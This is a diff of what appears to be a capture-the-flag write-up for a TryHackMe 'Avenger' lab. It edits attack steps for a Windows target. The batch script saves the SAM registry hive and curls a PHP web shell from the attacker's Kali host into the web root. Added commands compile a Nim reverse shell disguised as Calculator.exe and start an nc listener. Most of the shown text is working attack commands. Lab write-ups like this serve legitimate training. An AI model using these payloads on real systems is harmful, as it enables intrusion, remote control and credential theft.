@@ -116,8 +116,7 @@ wpscan --url http://avenger.tryhackme/gift --passwords /usr/share/wordlists/rock
 ```
 git clone https://github.com/flozz/p0wny-shell.git
 cd p0wny-shell/ 
-
-python2 -m SimpleHTTPServer 82
+subl exploit.bat
 ```
 
 **exploit.bat**
@@ -133,23 +132,45 @@ if %errorlevel% equ 0 (
     reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
 ) else (
     :: Run commands for other users
-    curl http://$VICTIM:82/shell.php -o C:\xampp\htdocs\shell.php
+    curl http://$KALI:82/shell.php -o C:\xampp\htdocs\shell.php
 )
 </code></pre>
 
+**Kali**
 
+```
+python2 -m SimpleHTTPServer 82
+```
 
 <figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>
 
 
 
+
+
 **Kali**
 
+<pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
+cd Nim-Reverse-Shell/
+<strong>apt install mingw-w64 -y
+</strong>curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+subl rev_shell.nim
+/root/.nimble/bin/nim c -d:mingw-w64  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
+</code></pre>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali #1**
+
 ```
-f
+/root/.nimble/bin/nim c -d:mingw-w64  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
 ```
 
+**Kali #2**
 
+```
+rlwrap nc -lvnp 443
+```
 
 
 
